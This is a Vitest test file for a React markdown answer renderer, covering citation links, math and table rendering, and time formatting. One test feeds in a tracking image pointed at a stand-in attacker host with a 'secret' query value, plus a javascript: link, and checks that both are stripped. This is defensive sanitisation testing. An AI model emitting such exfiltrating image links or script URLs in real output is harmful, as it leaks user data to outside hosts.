// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Ved Buddaraju

import { cleanup, render } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { AnswerMarkdown } from "./AnswerMarkdown";
import { normalizeMath, relativeTime, splitBlocks } from "./text";

afterEach(cleanup);

const src = (id: number, url = `https://s${id}.example/page`) => ({
  id,
  url,
  title: `Title ${id}`,
  snippet: "snip",
  domain: `s${id}.example`,
  engines: [],
  used_in_answer: false,
  state: "read" as const,
});

describe("text helpers", () => {
  it("splits blocks but keeps fenced code together", () => {
    expect(splitBlocks("a\n\n```js\nx\n\ny\n```\n\nb")).toEqual(["a", "```js\nx\n\ny\n```", "b"]);
    expect(splitBlocks("\n\n  \nonly")).toEqual(["only"]);
  });

  it("converts LaTeX delimiters outside code only", () => {
    expect(normalizeMath("a \\(x^2\\) b")).toBe("a $$x^2$$ b");
    expect(normalizeMath("\\[E=mc^2\\]")).toContain("$$\nE=mc^2\n$$");
    expect(normalizeMath("`\\(x\\)` and\n```\n\\(y\\)\n```")).toBe("`\\(x\\)` and\n```\n\\(y\\)\n```");
  });

  it("formats relative time in the requested locale", () => {
    const now = Date.parse("2026-03-10T00:00:00Z");
    expect(relativeTime("2026-03-09T00:00:00Z", "en", now)).toBe("yesterday");
    expect(relativeTime("2026-03-09T00:00:00Z", "ar", now)).not.toBe("yesterday");
    expect(relativeTime("nonsense", "en", now)).toBeNull();
    expect(relativeTime(null)).toBeNull();
  });
});

describe("AnswerMarkdown", () => {
  it("turns known [n] into citation links and leaves unknown ones as text", () => {
    const { container } = render(<AnswerMarkdown text="Fact [1] and fabricated [7]." sources={[src(1)]} />);
    const chips = container.querySelectorAll('a[data-gw="citation"]');
    expect(chips).toHaveLength(1);
    expect(chips[0].getAttribute("href")).toBe("https://s1.example/page");
    expect(chips[0].getAttribute("aria-label")).toContain("Title 1");
    expect(container.textContent).toContain("[7]");
  });

  it("does not linkify [1] inside code", () => {
    const { container } = render(<AnswerMarkdown text="Use `arr[1]` here" sources={[src(1)]} />);
    expect(container.querySelector('a[data-gw="citation"]')).toBeNull();
  });

  it("never loads remote images unless a resolver is provided, and strips javascript: links", () => {
    const md = "![tracker](https://evil.example/p.png?d=secret)\n\n[click](javascript:alert(1))";
    const a = render(<AnswerMarkdown text={md} />);
    expect(a.container.querySelector("img")).toBeNull();
    expect(a.container.querySelector("a")).toBeNull();
    a.unmount();
    const b = render(
      <AnswerMarkdown
        text="![pic](https://ok.example/p.png)"
        resolveImage={(s) => `/proxy/image?url=${encodeURIComponent(s)}`}
      />,
    );
    expect(b.container.querySelector("img")?.getAttribute("src")).toBe(
      "/proxy/image?url=https%3A%2F%2Fok.example%2Fp.png",
    );
    expect(b.container.querySelector("img")?.getAttribute("referrerpolicy")).toBe("no-referrer");
  });

  it("renders GFM tables, highlighted code with a copy button, and math", () => {
    const md = "| a | b |\n|---|---|\n| 1 | 2 |\n\n```python\nprint(1)\n```\n\n$$x^2$$";
    const { container } = render(<AnswerMarkdown text={md} />);
    expect(container.querySelector(".gw-table table")).not.toBeNull();
    expect(container.querySelector(".gw-code .gw-copy")).not.toBeNull();
    expect(container.querySelector(".gw-code-lang")?.textContent).toBe("python");
    expect(container.querySelector(".katex")).not.toBeNull();
  });

  it("does not treat currency as math", () => {
    const { container } = render(<AnswerMarkdown text="It costs $5 and $10 in total." />);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.textContent).toContain("$5 and $10");
  });
});
